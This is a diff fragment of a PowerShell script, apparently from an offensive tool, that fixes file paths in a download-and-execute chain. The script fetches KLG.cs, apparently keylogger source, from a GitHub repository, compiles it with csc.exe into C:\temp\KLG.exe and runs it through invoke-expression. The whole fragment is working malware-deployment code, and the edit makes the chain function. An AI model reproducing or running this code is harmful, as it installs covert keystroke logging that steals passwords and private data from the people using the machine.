@@ -20,7 +20,7 @@ invoke-expression $command
 $my_path_k="C:\temp\KLG.cs"
 $url_k='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/KLG.cs';
 $b.DownloadFile($url_k, $my_path_k) ;
-$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\KLG.exe D:\KLG.cs"
+$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\KLG.exe C:\temp\KLG.cs"
 invoke-expression $command
 $command="cmd /C C:\temp\KLG.exe"
 invoke-expression $command
